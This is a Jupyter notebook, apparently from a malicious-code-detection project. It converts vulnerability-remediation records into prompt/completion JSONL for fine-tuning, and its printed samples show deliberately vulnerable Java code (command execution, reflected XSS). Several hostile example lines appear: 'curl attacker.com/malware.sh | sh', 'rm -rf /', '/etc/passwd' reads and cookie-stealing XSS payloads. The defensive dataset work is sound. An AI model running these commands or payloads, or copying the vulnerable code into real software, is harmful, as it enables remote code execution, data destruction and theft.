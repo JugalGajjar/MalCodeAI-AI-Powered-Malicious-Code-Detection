{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "a46f727b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "d4059769",
   "metadata": {},
   "outputs": [],
   "source": [
    "input_file = \"Phase-3-Data/Final_aggregated_output.json\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "74f28e35",
   "metadata": {},
   "outputs": [],
   "source": [
    "try:\n",
    "    with open(input_file, 'r') as f:\n",
    "        data = json.load(f)\n",
    "except FileNotFoundError:\n",
    "    print(f\"Error: Input file '{input_file}' not found.\")\n",
    "except json.JSONDecodeError:\n",
    "    print(f\"Error: Could not decode JSON from '{input_file}'.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "e86729c7",
   "metadata": {},
   "outputs": [],
   "source": [
    "def update_keys(data):\n",
    "    transformed_data = []\n",
    "\n",
    "    if not isinstance(data, list):\n",
    "        print(\"Error: Input data is not a list.\")\n",
    "        return transformed_data\n",
    "    \n",
    "    for item in data:\n",
    "        transformed_item = {}\n",
    "\n",
    "        if \"instruction\" in item:\n",
    "            transformed_item[\"prompt\"] = item.pop(\"instruction\")\n",
    "        if \"output\" in item:\n",
    "            transformed_item[\"completion\"] = item.pop(\"output\")\n",
    "        \n",
    "        transformed_data.append(transformed_item)\n",
    "    \n",
    "    return transformed_data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "605eaf70",
   "metadata": {},
   "outputs": [],
   "source": [
    "updated_data = update_keys(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "3188b779",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Updated data item 0:\n",
      "{\n",
      "    \"prompt\": \"\\nGiven the following inputs:\\n- Vulnerability Type: Remote Code Execution (RCE)\\n- Vulnerable Code: import java.io.BufferedReader;\\nimport java.io.IOException;\\nimport java.io.InputStreamReader;\\n\\npublic class VulnerableApp {\\n    public static void main(String[] args) {\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\n        try {\\n            System.out.print(\\\"Enter command: \\\");\\n            String command = reader.readLine();\\n            Process process = Runtime.getRuntime().exec(command);\\n            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\\n            String line;\\n            while ((line = outputReader.readLine()) != null) {\\n                System.out.println(line);\\n            }\\n        } catch (IOException e) {\\n            e.printStackTrace();\\n        }\\n    }\\n}\\n- CVSS Score: 9.8\\n\\nYour task is to:\\n1. Provide a fully secure, fixed version of the vulnerable code.\\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\\n\\nSTRICT RULES:\\n- Output ONLY a valid JSON object.\\n- Do NOT add any explanations, markdown, or comments.\\n- Escape all double quotes properly.\\n- Use the following keys in the final JSON:\\n    - \\\"vulnerability_type\\\": same as input\\n    - \\\"vulnerability_code\\\": same as input (escaped)\\n    - \\\"cvss_score\\\": same as input\\n    - \\\"fixed_code\\\": remediated and secure version of the code\\n    - \\\"exploit_ways\\\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\\n\\nJSON FORMAT EXAMPLE:\\n{{\\n    \\\"vulnerability_type\\\": \\\"Command Injection\\\",\\n    \\\"vulnerability_code\\\": \\\"# Python example\\\\ndef unsafe():\\\\n    import os\\\\n    cmd = input(\\\\\\\"Enter command: \\\\\\\")\\\\n    os.system(cmd)\\\",\\n    \\\"cvss_score\\\": 8.6,\\n    \\\"fixed_code\\\": \\\"# Python example\\\\ndef safe():\\\\n    import subprocess\\\\n    allowed = ['ls', 'whoami']\\\\n    cmd = input(\\\\\\\"Enter command: \\\\\\\")\\\\n    if cmd in allowed:\\\\n        subprocess.run([cmd])\\\\n    else:\\\\n        print(\\\\\\\"Not allowed\\\\\\\")\\\",\\n    \\\"exploit_ways\\\": [\\n        \\\"User could input 'rm -rf /' to delete system files.\\\",\\n        \\\"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\\\",\\n        \\\"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\\\"\\n    ]\\n}}\\n\",\n",
      "    \"completion\": \"{\\\"vulnerability_code\\\": \\\"import java.io.BufferedReader;\\\\\\\\nimport java.io.IOException;\\\\\\\\nimport java.io.InputStreamReader;\\\\\\\\n\\\\\\\\npublic class VulnerableApp {\\\\\\\\n    public static void main(String[] args) {\\\\\\\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\\\\\\\n        try {\\\\\\\\n            System.out.print(\\\\\\\\\\\\\\\"Enter command: \\\\\\\\\\\\\\\");\\\\\\\\n            String command = reader.readLine();\\\\\\\\n            Process process = Runtime.getRuntime().exec(command);\\\\\\\\n            BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\\\\\\\\n            String line;\\\\\\\\n            while ((line = outputReader.readLine()) != null) {\\\\\\\\n                System.out.println(line);\\\\\\\\n            }\\\\\\\\n        } catch (IOException e) {\\\\\\\\n            e.printStackTrace();\\\\\\\\n        }\\\\\\\\n    }\\\\\\\\n}\\\", \\\"vulnerability_type\\\": \\\"Remote Code Execution (RCE)\\\", \\\"cvss_score\\\": 9.8, \\\"fixed_code\\\": \\\"import java.io.BufferedReader;\\\\\\\\nimport java.io.IOException;\\\\\\\\nimport java.io.InputStreamReader;\\\\\\\\n\\\\\\\\npublic class SecureApp {\\\\\\\\n    public static void main(String[] args) {\\\\\\\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\\\\\\\n        try {\\\\\\\\n            System.out.print(\\\\\\\\\\\\\\\"Enter command: \\\\\\\\\\\\\\\");\\\\\\\\n            String command = reader.readLine();\\\\\\\\n            if (command.equals(\\\\\\\\\\\\\\\"ls\\\\\\\\\\\\\\\") || command.equals(\\\\\\\\\\\\\\\"whoami\\\\\\\\\\\\\\\")) {\\\\\\\\n                Process process = Runtime.getRuntime().exec(command);\\\\\\\\n                BufferedReader outputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\\\\\\\\n                String line;\\\\\\\\n                while ((line = outputReader.readLine()) != null) {\\\\\\\\n                    System.out.println(line);\\\\\\\\n                }\\\\\\\\n            } else {\\\\\\\\n                System.out.println(\\\\\\\\\\\\\\\"Command not allowed.\\\\\\\\\\\\\\\");\\\\\\\\n            }\\\\\\\\n        } catch (IOException e) {\\\\\\\\n            e.printStackTrace();\\\\\\\\n        }\\\\\\\\n    }\\\\\\\\n}\\\", \\\"exploit_ways\\\": [\\\"User could input 'rm -rf /' to delete system files.\\\", \\\"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\\\", \\\"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\\\"]}\"\n",
      "}\n",
      "\n",
      "Updated data item 1:\n",
      "{\n",
      "    \"prompt\": \"\\nGiven the following inputs:\\n- Vulnerability Type: Cross-Site Scripting (XSS)\\n- Vulnerable Code: import javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\nimport java.io.IOException;\\n\\npublic class VulnerableServlet extends HttpServlet {\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\n        String userInput = request.getParameter(\\\"userInput\\\");\\n        if (userInput != null) {\\n            response.setContentType(\\\"text/html\\\");\\n            response.getWriter().println(\\\"<html><body>\\\");\\n            response.getWriter().println(\\\"User Input: \\\" + userInput);\\n            response.getWriter().println(\\\"</body></html>\\\");\\n        }\\n    }\\n}\\n- CVSS Score: 6.1\\n\\nYour task is to:\\n1. Provide a fully secure, fixed version of the vulnerable code.\\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\\n\\nSTRICT RULES:\\n- Output ONLY a valid JSON object.\\n- Do NOT add any explanations, markdown, or comments.\\n- Escape all double quotes properly.\\n- Use the following keys in the final JSON:\\n    - \\\"vulnerability_type\\\": same as input\\n    - \\\"vulnerability_code\\\": same as input (escaped)\\n    - \\\"cvss_score\\\": same as input\\n    - \\\"fixed_code\\\": remediated and secure version of the code\\n    - \\\"exploit_ways\\\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\\n\\nJSON FORMAT EXAMPLE:\\n{{\\n    \\\"vulnerability_type\\\": \\\"Command Injection\\\",\\n    \\\"vulnerability_code\\\": \\\"# Python example\\\\ndef unsafe():\\\\n    import os\\\\n    cmd = input(\\\\\\\"Enter command: \\\\\\\")\\\\n    os.system(cmd)\\\",\\n    \\\"cvss_score\\\": 8.6,\\n    \\\"fixed_code\\\": \\\"# Python example\\\\ndef safe():\\\\n    import subprocess\\\\n    allowed = ['ls', 'whoami']\\\\n    cmd = input(\\\\\\\"Enter command: \\\\\\\")\\\\n    if cmd in allowed:\\\\n        subprocess.run([cmd])\\\\n    else:\\\\n        print(\\\\\\\"Not allowed\\\\\\\")\\\",\\n    \\\"exploit_ways\\\": [\\n        \\\"User could input 'rm -rf /' to delete system files.\\\",\\n        \\\"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\\\",\\n        \\\"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\\\"\\n    ]\\n}}\\n\",\n",
      "    \"completion\": \"{\\\"vulnerability_code\\\": \\\"import javax.servlet.http.HttpServlet;\\\\\\\\nimport javax.servlet.http.HttpServletRequest;\\\\\\\\nimport javax.servlet.http.HttpServletResponse;\\\\\\\\nimport java.io.IOException;\\\\\\\\n\\\\\\\\npublic class VulnerableServlet extends HttpServlet {\\\\\\\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\\\\\\\n        String userInput = request.getParameter(\\\\\\\\\\\\\\\"userInput\\\\\\\\\\\\\\\");\\\\\\\\n        if (userInput != null) {\\\\\\\\n            response.setContentType(\\\\\\\\\\\\\\\"text/html\\\\\\\\\\\\\\\");\\\\\\\\n            response.getWriter().println(\\\\\\\\\\\\\\\"<html><body>\\\\\\\\\\\\\\\");\\\\\\\\n            response.getWriter().println(\\\\\\\\\\\\\\\"User Input: \\\\\\\\\\\\\\\" + userInput);\\\\\\\\n            response.getWriter().println(\\\\\\\\\\\\\\\"</body></html>\\\\\\\\\\\\\\\");\\\\\\\\n        }\\\\\\\\n    }\\\\\\\\n}\\\", \\\"vulnerability_type\\\": \\\"Cross-Site Scripting (XSS)\\\", \\\"cvss_score\\\": 6.1, \\\"fixed_code\\\": \\\"import javax.servlet.http.HttpServlet;\\\\\\\\nimport javax.servlet.http.HttpServletRequest;\\\\\\\\nimport javax.servlet.http.HttpServletResponse;\\\\\\\\nimport java.io.IOException;\\\\\\\\n\\\\\\\\npublic class SecureServlet extends HttpServlet {\\\\\\\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\\\\\\\n        String userInput = request.getParameter(\\\\\\\\\\\\\\\"userInput\\\\\\\\\\\\\\\");\\\\\\\\n        if (userInput != null) {\\\\\\\\n            response.setContentType(\\\\\\\\\\\\\\\"text/html\\\\\\\\\\\\\\\");\\\\\\\\n            response.getWriter().println(\\\\\\\\\\\\\\\"<html><body>\\\\\\\\\\\\\\\");\\\\\\\\n            response.getWriter().println(\\\\\\\\\\\\\\\"User Input: \\\\\\\\\\\\\\\" + org.owasp.encoder.Encode.forHtml(userInput));\\\\\\\\n            response.getWriter().println(\\\\\\\\\\\\\\\"</body></html>\\\\\\\\\\\\\\\");\\\\\\\\n        }\\\\\\\\n    }\\\\\\\\n}\\\", \\\"exploit_ways\\\": [\\\"An attacker can inject a script like <script>alert('XSS')</script> to execute arbitrary JavaScript in the user's browser.\\\", \\\"They could use <img src=x onerror=alert(document.cookie)> to steal cookies or sensitive data.\\\", \\\"Cross-site requests with injected scripts might lead to session hijacking.\\\"]}\"\n",
      "}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "for i in range(2):\n",
    "    print(f\"Updated data item {i}:\")\n",
    "    print(json.dumps(updated_data[i], indent=4))\n",
    "    print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "10e34d9e",
   "metadata": {},
   "outputs": [],
   "source": [
    "def convert_json_to_jsonl(data, output_file):\n",
    "    try:\n",
    "        with open(output_file, \"w\") as f:\n",
    "            if isinstance(data, list):\n",
    "                for item in data:\n",
    "                    json.dump(item, f) # Write each item as a JSON line\n",
    "                    f.write(\"\\n\") # Add newline character\n",
    "                    \n",
    "        print(f\"Successfully converted to JSONL and saved to '{output_file}'.\")\n",
    "    except IOError:\n",
    "        print(f\"Error: Could not write to output file '{output_file}'.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "ed57f6f5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Successfully converted to JSONL and saved to 'Phase-3-Data/Data_for_MLX_fine_tuning.jsonl'.\n"
     ]
    }
   ],
   "source": [
    "convert_json_to_jsonl(updated_data, \"Phase-3-Data/Data_for_MLX_fine_tuning.jsonl\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7783aa07",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "malcodeai",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
